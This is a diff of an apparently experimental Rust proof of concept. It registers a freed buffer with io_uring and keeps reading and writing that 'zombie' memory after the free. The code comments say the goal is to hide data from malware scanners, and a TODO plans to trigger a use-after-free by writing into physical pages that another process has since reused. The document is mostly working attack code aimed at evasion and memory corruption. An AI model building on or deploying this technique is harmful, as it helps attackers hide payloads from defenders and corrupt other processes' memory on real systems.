@@ -1,25 +1,30 @@
 use io_uring::{opcode, types, IoUring};
 use libc::{iovec};
 use std::fs::{File, OpenOptions};
+use std::io::{Read, Write};
 use std::os::unix::io::AsRawFd;
-use std::{io::Read};
 
 // desync kernel from application
 // pinning allows kernel to bypass standard page table checks
 // io_uring implmentation doesn't synchronize virtual memory address with fixed buffer registration
 // allows us to store data in a zombie page but be able to delete address mapping (munmap)
 // deleting address mapping makes it so that malware scanners can't see it
-// still able to use io_uring to write the zombie data even though it's 'deleted'
-// functionally side channel storage
+// io_uring allows us to write to the zombie buffer
+// also allows us to read from the zombie buffer
+// functionally bi-directional side channel storage
 
-// enables Use after free?
-// register buffer & munmap it
-// wait for another process/own process to allocate same physical memory
-// write to original fixed buffer index
+// TODO: next steps:
+// Task 1
+// discover the maximum amount of zombie memory we can hold
+// may be able to compare free -m (Physical reality) vs ps -o rss (OS reporting)
+// Task 2
+// trigger UaF
+// register + droplarge buffer
+// wait for another process/own process to allocate same physical memory (prob alot)
+// write to zombie buffer in og process
+// check for corruption
+// KASAN should trigger a report
 
-// next steps:
-// move towards safer rust
-// check if registering + dropping vec<u8> works same way?
 
 fn main() {
     // allocate memory and store secret at addr
@@ -34,10 +39,6 @@ fn main() {
     // pin it with fixed buffer
     // pinning increments ref count on physical RAM
     let mut ring = IoUring::new(8).expect("ring failed");
-    let out_file = OpenOptions::new()
-                    .write(true).create(true).truncate(true)
-                    .open("/tmp/zombie_output.txt").unwrap();
-    let out_fd = types::Fd(out_file.as_raw_fd());
 
     println!("Pinning vector (increases ref count)");
     unsafe {
@@ -49,23 +50,42 @@ fn main() {
     // 'free' memory, memory should be gone in rust's eyes
     drop(v);
 
+    // create new data file to write from
+    let new_data = b"new update data";
+    let mut src_file = OpenOptions::new().read(true).write(true).create(true).truncate(true).open("/tmp/ghost_input.txt").unwrap();
+    src_file.write_all(new_data).unwrap();
+    let src_fd = types::Fd(src_file.as_raw_fd());
+
+    println!("Request: Read from new buffer; Write to ghost buffer");
     unsafe {
-        let write_op = opcode::WriteFixed::new(out_fd, ptr, secret.len() as u32, 0).build();
+        libc::lseek(src_fd.0, 0, libc::SEEK_SET);
+        let read_op = opcode::ReadFixed::new(src_fd, ptr as *mut u8, new_data.len() as u32, 0).build();
+        ring.submission().push(&read_op).expect("queue full");
+    }
+    ring.submit_and_wait(1).unwrap();
+    let _ = ring.completion().next();
+
+    let out_file = OpenOptions::new().write(true).create(true).truncate(true).open("/tmp/ghost_output.txt").unwrap();
+    let out_fd = types::Fd(out_file.as_raw_fd());
+
+    println!("Request: Read from ghost buffer; Write to output buffer");
+    unsafe {
+        let write_op = opcode::WriteFixed::new(out_fd, ptr, new_data.len() as u32, 0).build();
         ring.submission().push(&write_op).expect("queue full");
     }
-
     ring.submit_and_wait(1).unwrap();
+    let _ = ring.completion().next();
 
     // check results
-    let mut check_file = File::open("/tmp/zombie_output.txt").unwrap();
+    let mut check_file = File::open("/tmp/ghost_output.txt").unwrap();
     let mut contents = String::new();
     check_file.read_to_string(&mut contents).unwrap();
 
-    println!("expected: {:?}", std::str::from_utf8(secret).unwrap());
+    println!("expected: {:?}", std::str::from_utf8(new_data).unwrap());
     println!("actual:   {:?}", contents);
 
-    if contents.as_bytes() == secret {
-        println!("side channel storage enabled");
+    if contents.as_bytes() == new_data {
+        println!("bi-directional side channel enabled");
     } else {
         println!("data got lost or corrupted");
     }
